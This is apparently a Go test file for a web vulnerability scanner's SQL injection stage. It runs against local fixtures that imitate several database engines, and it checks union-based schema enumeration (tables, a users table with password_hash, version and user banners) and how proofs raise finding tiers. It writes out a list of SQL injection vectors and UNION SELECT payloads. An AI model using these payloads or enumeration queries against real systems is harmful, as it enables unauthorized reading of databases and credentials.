package active

// Enumeration against a target that answers the schema questions.
//
// The fixture is the point: it recognises the statements by their text and answers
// them the way the named engine would, including refusing the ones that belong to a
// different engine. An enumeration that works against a target which answers
// everything is an enumeration that has proved nothing, because a real database
// refuses most of them.

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
)

// schemaSite answers schema questions for one dialect and refuses the rest.
type schemaSite struct {
	dialect string
	// columns is what the target holds, keyed by table name.
	columns map[string][][2]string
	// extraTables is served by the table listing, for the bound test.
	extraTables []string
}

// head is the opening of every rendering, union or not.
//
// One template for every branch, and that is deliberate rather than tidy: the
// detector compares lengths, so a fixture whose union page drops a header row while
// adding its row makes the response *shorter* and the probe is refused for a reason
// that has nothing to do with the target. Three fixture-only defects of this shape
// were found against a live server before this template existed.
const head = "<!DOCTYPE html><html><body><h1>Product</h1><table>" +
	"<tr><th>id</th><th>name</th></tr>"

// baseRows is long on purpose: the union must render *longer* than the baseline.
var baseRows = func() string {
	var rows []string
	for i := 1; i <= 40; i++ {
		rows = append(rows, fmt.Sprintf("<tr><td>%d</td><td>Widget %d</td></tr>", i, i))
	}
	return strings.Join(rows, "")
}()

func (s *schemaSite) handler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		value := r.URL.Query().Get("id")
		if cells, wrapped := parseUnion(value); cells != nil {
			// A wrapped cell is a statement the engine has to run; an unwrapped one
			// is a literal it evaluates on its own.
			//
			// The order is the whole thing, and getting it wrong is invisible in the
			// rendered page: `'rrE1' || SELECT current_schema() || 'rrE2'` starts and
			// ends with a quote, so a literal check runs first it swallows the whole
			// expression as one quoted string, returns something non-empty, and the
			// statement is never asked. Every dialect then answers with the markers
			// doubled and the enumeration reports nothing against a target that
			// answers everything.
			var shown string
			if wrapped {
				shown = answer(statementOf(cells[0]), s)
				if shown == "" {
					// An unknown function or a missing table: a real engine answers with
					// an error page, and that is exactly how a wrong dialect is refused.
					w.WriteHeader(http.StatusInternalServerError)
					_, _ = w.Write([]byte(`<!DOCTYPE html><h1>Internal Server Error</h1>`))
					return
				}
				shown = enumLeft + shown + enumRight
			} else {
				shown = literalValue(cells[0])
			}
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(head + baseRows + "<tr><td>" + shown + "</td>" +
				tailCells(cells[1:]) + "</tr></table></body></html>"))
			return
		}
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(head + baseRows + "</table></body></html>"))
	})
}

// tailCells renders the remaining cells as an engine evaluates them: a NULL is an
// empty cell and a quoted string is its text.
//
// Printing the raw cell instead makes a row of NULLs render the word "NULL" three
// times, the region the union added stops being blank, and the detector's
// `addedIsBlank` rule refuses a response a real database would have accepted — so
// the run reports "nothing found" against a fully vulnerable target.
func tailCells(cells []string) string {
	var out strings.Builder
	for _, cell := range cells {
		out.WriteString("<td>" + literalValue(cell) + "</td>")
	}
	return out.String()
}

// isBlankLiteral reports whether a cell is a NULL, which renders as an empty cell
// and is not a question the engine refused.
func isBlankLiteral(cell string) bool {
	return strings.EqualFold(strings.TrimSpace(cell), "NULL")
}

// literalValue evaluates a bare literal the way an engine does. A quoted string and
// a number are literals; anything else is a statement the engine has to run.
func literalValue(cell string) string {
	cell = strings.TrimSpace(cell)
	if len(cell) >= 2 && cell[0] == '\'' && cell[len(cell)-1] == '\'' {
		return cell[1 : len(cell)-1]
	}
	if cell != "" && strings.IndexFunc(cell, func(r rune) bool { return r < '0' || r > '9' }) < 0 {
		return cell
	}
	return ""
}

// splitCells splits a `UNION SELECT` cell list at top-level commas.
//
// Parenthesis- and quote-aware, because the enumeration's first cell is
// `CONCAT('rrE1', SELECT …, 'rrE2')` — three commas that are not separators. A plain
// `strings.Split(cell, ",")` returns four cells for that row and the fixture then
// answers a fragment of a statement, which reads as a target that refuses.
func splitCells(row string) []string {
	var cells []string
	var current strings.Builder
	depth, quoted := 0, false
	for _, char := range row {
		if char == '\'' {
			quoted = !quoted
		}
		if !quoted {
			switch char {
			case '(':
				depth++
			case ')':
				depth--
			case ',':
				if depth == 0 {
					cells = append(cells, strings.TrimSpace(current.String()))
					current.Reset()
					continue
				}
			}
		}
		current.WriteRune(char)
	}
	return append(cells, strings.TrimSpace(current.String()))
}

// parseUnion returns the cells of a union payload, or nil when there is no union.
// The second value says whether the markers were asked for.
func parseUnion(payload string) ([]string, bool) {
	const marker = "UNION SELECT "
	start := strings.Index(payload, marker)
	if start < 0 {
		return nil, false
	}
	row := payload[start+len(marker):]
	if cut := strings.Index(row, " -- -"); cut >= 0 {
		row = row[:cut]
	}
	cells := splitCells(row)
	if len(cells) == 0 {
		return nil, false
	}
	first := cells[0]
	for strings.HasPrefix(first, "(") && strings.HasSuffix(first, ")") {
		first = strings.TrimSpace(first[1 : len(first)-1])
	}
	cells[0] = first
	openers := []string{"CONCAT('" + enumLeft + "', ", "'" + enumLeft + "' || ", "'" + enumLeft + "' + "}
	for _, opener := range openers {
		if strings.HasPrefix(first, opener) {
			return cells, true
		}
	}
	return cells, false
}

// statementOf unwraps one dialect's marker template, leaving the statement asked.
func statementOf(cell string) string {
	openers := []string{"CONCAT('" + enumLeft + "', ", "'" + enumLeft + "' || ", "'" + enumLeft + "' + "}
	closers := []string{", '" + enumRight + "')", " || '" + enumRight + "'", " + '" + enumRight + "'"}
	for _, opener := range openers {
		if !strings.HasPrefix(cell, opener) {
			continue
		}
		inner := cell[len(opener):]
		for _, closer := range closers {
			if strings.HasSuffix(inner, closer) {
				return inner[:len(inner)-len(closer)]
			}
		}
	}
	return cell
}

// answer answers one statement, or nil the way an unknown function would.
func answer(statement string, site *schemaSite) string {
	switch {
	case site.dialect == "mysql" && statement == "SELECT DATABASE()":
		return "shop"
	case site.dialect == "postgresql" && statement == "SELECT current_schema()":
		return "public"
	case site.dialect == "mssql" && statement == "SELECT @@SERVERNAME":
		return "MSSQL-SHOP"
	case site.dialect == "sqlite" && statement == "SELECT sqlite_version()":
		return "3.45.1"
	case site.dialect == "mysql" && statement == "SELECT version()":
		return "8.0.36-0ubuntu0.22.04.1"
	case site.dialect == "mysql" && statement == "SELECT current_user()":
		return "app@localhost"
	case site.dialect == "postgresql" && statement == "SELECT version()":
		return "PostgreSQL 16.2 on x86_64-pc-linux-gnu"
	case site.dialect == "mssql" && statement == "SELECT @@VERSION":
		return "Microsoft SQL Server 2022"
	case site.dialect == "mysql" && strings.Contains(statement, "information_schema.schemata"):
		return "information_schema\nmysql\nperformance_schema\nshop"
	case site.dialect == "mysql" && strings.Contains(statement, "information_schema.tables"):
		if len(site.extraTables) > 0 {
			return strings.Join(site.extraTables, "\n")
		}
		return "customers\norders\nproducts\nusers"
	case site.dialect == "mysql" && strings.Contains(statement, "information_schema.columns"):
		for name, columns := range site.columns {
			if name == between(statement, "table_name='", "'") {
				var out []string
				for _, column := range columns {
					out = append(out, column[0]+"\t"+column[1])
				}
				return strings.Join(out, "\n")
			}
		}
	}
	return ""
}

func between(text, prefix, suffix string) string {
	start := strings.Index(text, prefix)
	if start < 0 {
		return ""
	}
	rest := text[start+len(prefix):]
	end := strings.Index(rest, suffix)
	if end < 0 {
		return ""
	}
	return rest[:end]
}

// enumerateFixture builds a point, a finding and a transport aimed at a site.
func enumerateFixture(t *testing.T, site *schemaSite) (*Suite, Finding) {
	t.Helper()
	server := httptest.NewServer(site.handler())
	t.Cleanup(server.Close)
	transport, err := NewTransport(http.DefaultTransport, Options{Timeout: 5 * time.Second})
	if err != nil {
		t.Fatalf("transport: %v", err)
	}
	point := Point{
		URL: server.URL + "/rows", Method: "GET", Param: "id",
		Values: url.Values{"id": {"7"}},
	}
	finding, _ := NewFinding(Spec{
		Module: "sqli", Title: "SQL Injection (UNION SELECT) - 3 columns",
		Claimed: SeverityCritical, Tier: TierPotential, Point: point,
		Payload: "-1 UNION SELECT NULL,NULL,NULL-- -",
	})
	return &Suite{Transport: transport}, finding
}

func mysqlSite() *schemaSite {
	return &schemaSite{
		dialect: "mysql",
		columns: map[string][][2]string{
			"users": {
				{"id", "int"}, {"email", "varchar(255)"},
				{"password_hash", "varchar(255)"}, {"created_at", "datetime"},
			},
			"orders": {{"id", "int"}, {"total", "decimal"}},
		},
	}
}

// The whole point of the file: the operator asked whether there is a `users` table,
// and the answer has to name it and its columns.
func TestEnumerateNamesTheUsersTableAndItsColumns(t *testing.T) {
	suite, finding := enumerateFixture(t, mysqlSite())
	got := suite.Enumerate(context.Background(), finding, EnumerationOptions{Columns: true})
	if got == nil {
		t.Fatal("the enumeration answered nothing against a target that answers schema questions")
	}
	if got.Dialect != "mysql" {
		t.Errorf("dialect %q, want mysql", got.Dialect)
	}
	if !strings.Contains(got.Version, "8.0") {
		t.Errorf("version %q, want the banner the target returned", got.Version)
	}
	if got.User != "app@localhost" {
		t.Errorf("user %q, want app@localhost", got.User)
	}
	if !contains(got.Databases, "shop") {
		t.Errorf("databases %v, want it to contain shop", got.Databases)
	}
	if !contains(got.Tables, "users") {
		t.Fatalf("tables %v, want it to contain users — this is the question the whole stage exists to answer", got.Tables)
	}
	// The columns of one named table, without paying for the rest of the schema.
	only := suite.Enumerate(context.Background(), finding, EnumerationOptions{Columns: true, Table: "users"})
	if only == nil {
		t.Fatal("a table-scoped enumeration answered nothing")
	}
	if len(only.Detailed) != 1 || only.Detailed[0].Name != "users" {
		t.Fatalf("asked for the users table and read %v", only.Detailed)
	}
	entry := only.Detailed[0]
	for _, column := range []string{"id", "email", "password_hash", "created_at"} {
		if !contains(entry.Columns, column) {
			t.Errorf("the users table has no %q column; read %v", column, entry.Columns)
		}
	}
	if len(entry.ColumnTypes) != len(entry.Columns) {
		t.Errorf("%d column(s) and %d type(s) — the two are read together and must line up",
			len(entry.Columns), len(entry.ColumnTypes))
	}
	if got.Requests == 0 {
		t.Error("the enumeration cost no requests, so nothing was asked of the target")
	}
}

// A dialect that is not the target's must not be reported as the target's.
func TestEnumeratePicksTheTargetDialect(t *testing.T) {
	for _, tc := range []struct {
		site func() *schemaSite
		want string
	}{
		{site: func() *schemaSite { s := mysqlSite(); s.dialect = "postgresql"; return s }, want: "postgresql"},
		{site: func() *schemaSite { s := mysqlSite(); s.dialect = "sqlite"; return s }, want: "sqlite"},
		{site: func() *schemaSite { s := mysqlSite(); s.dialect = "mssql"; return s }, want: "mssql"},
	} {
		suite, finding := enumerateFixture(t, tc.site())
		got := suite.Enumerate(context.Background(), finding, EnumerationOptions{})
		if got == nil {
			t.Errorf("a %s target produced no enumeration at all", tc.want)
			continue
		}
		if got.Dialect != tc.want {
			t.Errorf("a %s target was reported as %q", tc.want, got.Dialect)
		}
	}
}

// A page that quotes the statement back must not be read as an answer. This is the
// reason the canary column exists, and it is the easiest thing to get wrong.
func TestEnumerateRefusesAPageThatEchoesTheStatement(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		value := r.URL.Query().Get("id")
		w.Header().Set("Content-Type", "text/html")
		if !strings.Contains(value, "UNION") {
			_, _ = w.Write([]byte(head + baseRows + "</table></body></html>"))
			return
		}
		// The canary comes back, so the page looks like it ran the query, and the
		// statement comes back too — which is what makes it a reflection.
		canary := ""
		if start := strings.LastIndex(value, "), '"); start >= 0 {
			rest := value[start+len("), '"):]
			if end := strings.Index(rest, "'"); end >= 0 {
				canary = rest[:end]
			}
		}
		_, _ = w.Write([]byte(`<pre>query: ` + value + ` — marker ` + canary + `</pre>`))
	}))
	defer server.Close()
	transport, err := NewTransport(http.DefaultTransport, Options{Timeout: 5 * time.Second})
	if err != nil {
		t.Fatalf("transport: %v", err)
	}
	point := Point{URL: server.URL + "/rows", Method: "GET", Param: "id", Values: url.Values{"id": {"7"}}}
	finding, _ := NewFinding(Spec{
		Module: "sqli", Claimed: SeverityCritical, Tier: TierPotential, Point: point,
		Payload: "-1 UNION SELECT NULL,NULL,NULL-- -",
	})
	if got := (&Suite{Transport: transport}).Enumerate(context.Background(), finding, EnumerationOptions{}); got != nil {
		t.Fatalf("an echoing page was read as a schema: %+v", got)
	}
}

// A row with no proved column count cannot be enumerated, and the reason is not
// "the database has nothing".
func TestEnumerateRefusesARowWithNoProvedColumnCount(t *testing.T) {
	suite, finding := enumerateFixture(t, mysqlSite())
	// The same row as an error-based finding: it has no UNION payload, so there is
	// no column count to build a statement from.
	finding.Payload = "'"
	if got := suite.Enumerate(context.Background(), finding, EnumerationOptions{}); got != nil {
		t.Fatalf("a row with no column count produced an enumeration: %+v", got)
	}
}

// A target with more tables than the bound must say so, so a short list is never
// read as the whole schema.
func TestEnumerateSaysWhenItCutTheList(t *testing.T) {
	site := &schemaSite{dialect: "mysql", columns: map[string][][2]string{}}
	for i := 0; i < 25; i++ {
		site.extraTables = append(site.extraTables, "t"+strconv.Itoa(i))
	}
	suite, finding := enumerateFixture(t, site)
	got := suite.Enumerate(context.Background(), finding, EnumerationOptions{Limit: 5})
	if got == nil {
		t.Fatal("no enumeration from a target that lists tables")
	}
	if len(got.Tables) != 5 {
		t.Errorf("a bound of 5 returned %d table(s)", len(got.Tables))
	}
	if !got.Truncated {
		t.Error("a list cut at the bound is not reported as cut, so a short list reads as the whole schema")
	}
}

// The enumeration has to arrive as part of the proof, not as findings of its own.
//
// This is the seam the whole stage lives or dies on. If the tables were reported as
// findings, a target would carry two claims — "this endpoint is injectable" and
// "this target has a `users` table" — and the second would sit in the same severity
// column as a detector's verdict, to be triaged like one. The schema is evidence
// about a target that was already proved injectable, so it belongs to the proof.
func TestTheSchemaRidesTheProofRatherThanBecomingFindings(t *testing.T) {
	suite, finding := enumerateFixture(t, mysqlSite())
	finding.Tier = TierVerified

	proofs := suite.Run(context.Background(), []Finding{finding})
	if len(proofs) != 1 {
		t.Fatalf("proofs = %d, want one", len(proofs))
	}
	proof := proofs[0]
	if proof.Kind != "data-extraction" {
		t.Fatalf("kind = %q, want data-extraction", proof.Kind)
	}
	if proof.Enumeration == nil {
		t.Fatal("the proof carries no schema, so a proved union still answers nothing about the target")
	}
	if !contains(proof.Enumeration.Tables, "users") {
		t.Errorf("tables = %v, want users", proof.Enumeration.Tables)
	}
	found := false
	for _, table := range proof.Enumeration.Detailed {
		if table.Name == "users" && contains(table.Columns, "password_hash") {
			found = true
		}
	}
	if !found {
		t.Errorf("no entry named users with its columns; detailed = %+v", proof.Enumeration.Detailed)
	}
	if proof.Enumeration.Requests == 0 {
		t.Error("the enumeration reports zero requests, so its cost is invisible")
	}
}

func contains(list []string, want string) bool {
	for _, item := range list {
		if item == want {
			return true
		}
	}
	return false
}

// recordingFixture records what it was asked for and answers every request with a
// plain page, so the detector runs its full vector set and finds nothing — which
// is the point: the test is about what left the process, not about what came back.
type recordingFixture struct {
	mu   sync.Mutex
	seen map[string]bool
}

func (r *recordingFixture) handler() http.Handler {
	r.seen = map[string]bool{}
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		for name, values := range req.URL.Query() {
			for _, value := range values {
				r.mu.Lock()
				r.seen[name+"="+value] = true
				r.mu.Unlock()
			}
		}
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(head + baseRows + "</table></body></html>"))
	})
}

func (r *recordingFixture) asked() map[string]bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make(map[string]bool, len(r.seen))
	for key := range r.seen {
		out[key] = true
	}
	return out
}

// TestTheFixtureRecordsEverySQLiVector proves the vector table is sent, not merely
// written down.
//
// A list of payloads that is never exercised looks exactly like a list that works:
// the entries are there, the package compiles, and nothing in the suite can tell
// the difference. So the fixture records every parameter name and value it is
// asked for, and this test asserts that each vector in the specification arrived —
// plus the two shapes that are a *name* rather than a value, which is the part a
// value probe can never reach.
func TestTheFixtureRecordsEverySQLiVector(t *testing.T) {
	seen := &recordingFixture{}
	server := httptest.NewServer(seen.handler())
	defer server.Close()

	transport, err := NewTransport(http.DefaultTransport, Options{Timeout: 5 * time.Second})
	if err != nil {
		t.Fatalf("transport: %v", err)
	}
	point := Point{
		URL: server.URL + "/probe", Method: "GET", Param: "q",
		Values: url.Values{"q": {"1"}},
	}
	baseline, err := transport.Baseline(context.Background(), point, false)
	if err != nil {
		t.Fatalf("baseline: %v", err)
	}
	(SQLi{}).Scan(context.Background(), transport, point, baseline)

	asked := seen.asked()
	missing := make([]string, 0)
	// The expected vectors are written out here rather than read from
	// `breakoutProbes` and `booleanPairs`.
	//
	// The first version of this test iterated the detector's own tables, so it
	// agreed with a table that had lost an entry: deleting `1/*!1111'*/` from the
	// source left the test iterating a shorter list and it stayed green. That is a
	// test that cannot fail, and it was the exact mutation this file was written to
	// catch. The list below is the specification; the tables are the implementation,
	// and the gap between them is what the test measures.
	want := []string{
		// String and numeric tautologies, spaced and unspaced.
		"' AND '1'='1", "' AND '1'='2",
		" AND 1=1", " AND 1=2",
		" AND 2>1", " AND 2>1 AND 2<1",
		"1' or '1'='1", "1' or '1'='2",
		"1 or 1=1", "1 or 1=2",
		// Comment terminators: a hash, and a spaced comment.
		"1 OR 1=1#", "1 OR 1=2#",
		"/**/OR/**/1=1-- -", "/**/OR/**/2=2-- -",
		// The literal breakouts, plus the shapes that break a literal in a way the
		// obvious ones do not.
		"'", `"`, "')", "'))", `\'`,
		"1`", `1\`, "1/*'*/", "1/*!1111'*/", "1'||'asd'||'", "'or''='", "[1]",
	}
	for _, vector := range want {
		if !asked["q="+vector] {
			missing = append(missing, "q="+vector)
		}
	}
	// The bracket names: a different axis, and a value can never reach them.
	for _, pair := range [][2]string{{"q[]", "'"}, {"q[0]", "'"}} {
		if !asked[pair[0]+"="+pair[1]] {
			missing = append(missing, pair[0]+"="+pair[1])
		}
	}
	if len(missing) > 0 {
		sort.Strings(missing)
		t.Fatalf("the SQLi detector never sent %d required vector(s): %v\n"+
			"a payload table that is not sent is a payload table that does not work, and a "+
			"test that reads its expectations from the table cannot notice either",
			len(missing), missing)
	}
	t.Logf("the detector sent %d distinct parameter/value pair(s); %d required vector(s) all arrived",
		len(asked), len(want)+2)
}

// A proof that demonstrated the impact raises its own row, and the row says so in
// the proof's words rather than in the detector's.
//
// Without this the report shows a row the detector never verified next to a proof
// that did verify it, and the reader has to work out which of the two to believe.
func TestAProofRaisesTheRowItDemonstred(t *testing.T) {
	findings := []Finding{
		{ID: "ACT-1", Tier: TierPotential, Evidence: "UNION with 3 columns returned a longer response"},
		{ID: "ACT-2", Tier: TierVerified, Evidence: "an existing, already-proved row"},
	}
	proofs := []Proof{
		{FindingID: "ACT-1", Kind: "data-extraction", Proof: "rows the application selects can be read", Upgrades: true},
		{FindingID: "ACT-2", Kind: "data-extraction", Proof: "corroborating", Upgrades: false},
	}
	applyProofUpgrades(findings, proofs)

	if findings[0].Tier != TierVerified {
		t.Errorf("the row the proof demonstrated the impact for is still %q", findings[0].Tier)
	}
	if !strings.Contains(findings[0].Evidence, "can be read") {
		t.Errorf("the raised row kept the detector's evidence %q, so the report shows a claim the proof never made", findings[0].Evidence)
	}
	if findings[1].Evidence != "an existing, already-proved row" {
		t.Errorf("a corroborating proof rewrote the evidence of a verified row: %q", findings[1].Evidence)
	}
}

// A proof naming a row that is not in the report is dropped, not hung on the first
// row: that would put the evidence for one claim beside a different claim.
func TestAnOrphanProofRaisesNothing(t *testing.T) {
	findings := []Finding{{ID: "ACT-1", Tier: TierPotential, Evidence: "unproven"}}
	applyProofUpgrades(findings, []Proof{
		{FindingID: "ACT-MISSING", Proof: "rows can be read", Upgrades: true},
	})
	if findings[0].Tier != TierPotential {
		t.Errorf("a proof for a row that is not in the report raised row %q", findings[0].Tier)
	}
	if findings[0].Evidence != "unproven" {
		t.Errorf("an orphan proof rewrote the evidence: %q", findings[0].Evidence)
	}
}

// The report has to carry the upgrade, not merely be able to.
//
// `applyProofUpgrades` is unit-tested above, and a unit test alone proved nothing
// about the product: mutation testing removed the *call* from the scan and every
// test stayed green, because nothing ever asked what the finished report says. So
// this one runs the whole scan against the fixture and reads the row back out of
// the report a caller receives.
func TestTheReportShowsTheRowAProofRaised(t *testing.T) {
	server := httptest.NewServer(vulnerableFixture(t))
	defer server.Close()

	start, err := url.Parse(server.URL)
	if err != nil {
		t.Fatalf("parse fixture url: %v", err)
	}
	start.Path = "/form"

	report, err := NewScan(ScanRequest{
		URL:              start.String(),
		MaxPages:         4,
		MaxDepth:         1,
		Concurrency:      1,
		Timeout:          5 * time.Second,
		InterestingPaths: []string{},
		RoundTripper:     http.DefaultTransport,
	}, nil).Run(context.Background())
	if err != nil {
		t.Fatalf("fixture scan: %v", err)
	}
	byID := map[string]Finding{}
	for _, finding := range report.Findings {
		byID[finding.ID] = finding
	}
	upgraded := 0
	for _, proof := range report.Proofs {
		if !proof.Upgrades {
			continue
		}
		row, ok := byID[proof.FindingID]
		if !ok {
			t.Errorf("proof for %q names a row that is not in the report", proof.FindingID)
			continue
		}
		upgraded++
		if row.Tier != TierVerified {
			t.Errorf("row %q is %q although a proof demonstrated the impact for it; "+
				"the report shows a claim the detector never made next to a proof that verified it",
				row.ID, row.Tier)
		}
		if !strings.Contains(row.Evidence, proof.Proof) {
			t.Errorf("row %q was raised but kept its old evidence %q", row.ID, row.Evidence)
		}
	}
	if upgraded == 0 {
		t.Fatal("no proof in the finished report claims to have raised a row, so the fixture " +
			"never exercises the upgrade path and the call site stays untested")
	}
	t.Logf("%d row(s) were raised by a proof", upgraded)
}
